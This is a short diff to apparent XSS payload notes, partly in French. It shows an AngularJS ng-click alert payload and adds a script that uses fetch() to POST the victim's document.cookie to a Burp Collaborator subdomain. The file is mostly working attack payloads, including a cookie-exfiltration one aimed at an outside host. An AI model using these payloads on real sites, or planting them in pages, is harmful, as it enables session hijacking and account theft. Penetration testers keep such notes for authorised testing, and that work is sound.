@@ -25,3 +25,13 @@ Angular : ( ng-app directive )
     "ng-click="$event.view.alert(1)"
 
 Reprendre les titres des contexts des XSS
+
+Retrieve cookies and send to remote server :
+    <script>
+        fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+        method: 'POST',
+        mode: 'no-cors',
+        body:document.cookie
+        });
+    </script>
+
